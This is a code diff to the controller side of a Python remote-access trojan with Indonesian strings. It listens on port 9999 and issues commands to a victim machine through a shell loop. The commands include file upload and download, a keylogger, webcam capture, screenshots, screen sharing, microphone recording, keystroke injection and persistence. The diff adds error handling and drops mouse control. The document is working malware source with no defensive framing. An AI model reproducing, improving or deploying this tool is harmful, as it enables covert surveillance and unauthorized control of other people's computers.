@@ -10,7 +10,6 @@ import pyaudio
 import pyfiglet
 import random
 from colorama import Fore
-import server
 
 soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 soc.bind(('0.0.0.0', 9999))
@@ -186,9 +185,9 @@ def stream_cam():
 def upload_file(namafile):
      bufsize = 65536
      if not os.path.exists(namafile):
-         _target.sendall(struct.pack("Q", 0))
-         print(Fore.RED+'File not found')
-         return
+          _target.sendall(struct.pack("Q", 0))
+          print(Fore.RED+'file not found')
+          return
      filesize = os.path.getsize(namafile)
      _target.sendall(struct.pack("Q", filesize))
      with open(namafile, 'rb') as f:
@@ -203,8 +202,8 @@ def download_file(namafile):
      size_data = _target.recv(8)
      filesize = struct.unpack("Q", size_data)[0]
      if filesize == 0:
-         print(Fore.RED+'File not found')
-         return
+          print(Fore.RED+'file not found')
+          return 
      recv = 0
      with open(namafile, 'wb') as file:
         while recv < filesize:
@@ -227,48 +226,39 @@ def shellc():
     n = 0
     print(Fore.BLUE+"Type 'help' for help")
     while True:
-        perintah = input(Fore.GREEN+'shell> ')
-        data = json.dumps(perintah)
-        _target.send(data.encode())
-        if perintah in('exit','quit'):
-             break
-        elif perintah == 'clear':
+        try:
+          perintah = input(Fore.GREEN+'shell> ')
+          data = json.dumps(perintah)
+          _target.send(data.encode())
+          if perintah in('exit','quit'):
+              break
+          elif perintah == 'clear':
              os.system('clear')
-        elif perintah[:3] == 'cd ':
+          elif perintah[:3] == 'cd ':
              pass
-        elif perintah[:8] == 'download':
+          elif perintah[:8] == 'download':
              download_file(perintah[9:])
-        elif perintah[:6] == 'upload':
+          elif perintah[:6] == 'upload':
              upload_file(perintah[7:])
-        elif perintah == 'start_log':
+          elif perintah == 'start_log':
              print('starting keylogger')
              pass
-        elif perintah == 'baca_log':
+          elif perintah == 'baca_log':
              data = _target.recv(1024).decode()
              print(data)
-        elif perintah == 'clear_log':
+          elif perintah == 'clear_log':
              pass  
-        elif perintah == 'stop_log':
+          elif perintah == 'stop_log':
              print('stoping keylogger')
              pass
-        elif perintah == 'start_cam':
+          elif perintah == 'start_cam':
              stream_cam()
-        elif perintah ==  'screen_shot':
+          elif perintah ==  'screen_shot':
              n += 1
-             file = open("ss"+str(n)+".png", 'wb')
-             _target.settimeout(3)
-             _file = _target.recv(1024)
-             while _file:
-                  file.write(_file)
-                  try:
-                       _file = _target.recv(1024)
-                  except socket.timeout as e:
-                       break
-             _target.settimeout(None)
-             file.close()
-        elif perintah == 'screen_share':
+             download_file("ss"+str(n)+".png")
+          elif perintah == 'screen_share':
               screen_record(host='0.0.0.0', port=9991) 
-        elif perintah == 'help':
+          elif perintah == 'help':
              print(Fore.BLUE+"""
                    
                       basic command:
@@ -318,16 +308,14 @@ def shellc():
                    contoh:    persistence winsec manager.exe
                    =================================
 
-                     mic, keys and cursor command:
+                     mic, keys command:
                    ================================
                    -rec_audio >> merekam audio
                    
                    -send_key  >> mengetikan keyboard
-
-                   -send_mouse >> menggerakan kursor
                    ================================ 
                    
-                     windows system command:
+                     basic windows system command:
                    =================================
                    -cd        >> berpindah direktori
 
@@ -348,20 +336,36 @@ def shellc():
                    -type      >> menampilkan isi file
                    ================================= 
                    """)
-        elif perintah == 'rec_audio':
+          elif perintah == 'rec_audio':
              receive_and_save()
-        elif perintah == 'banner':
+          elif perintah == 'banner':
              list_banner = [pyfiglet.figlet_format('SHELL', font='slant'), pyfiglet.figlet_format('SHELL', font='3-d'), pyfiglet.figlet_format('SHELL', font='standard'), pyfiglet.figlet_format('SHELL', font='banner')]
              choice = random.choice(list_banner)
              print(choice)
-        elif perintah == 'send_key':
+          elif perintah == 'send_key':
              keystroke()   
-        elif perintah == 'send_mouse':
-             server.start_server(host='0.0.0.0', port=9994)
-        elif perintah == 'snap_cam':
+          elif perintah == 'snap_cam':
              start_image_server()  
-        else:
+          else:
              hasil = data_diterima()
              print(hasil)
-
+        except ConnectionResetError:
+            print('Connection closed')
+            break  
+        except BrokenPipeError:
+            print("Broken Pipe error")
+            break
+        except ConnectionRefusedError:
+            print("Connection refused")
+            break
+        except ConnectionError:
+            print("Connection error")
+            break
+        except ConnectionAbortedError:
+            print("Connection aborted")
+            break        
+        except KeyboardInterrupt:
+            print("exiting...")
+            break  
 shellc()
+
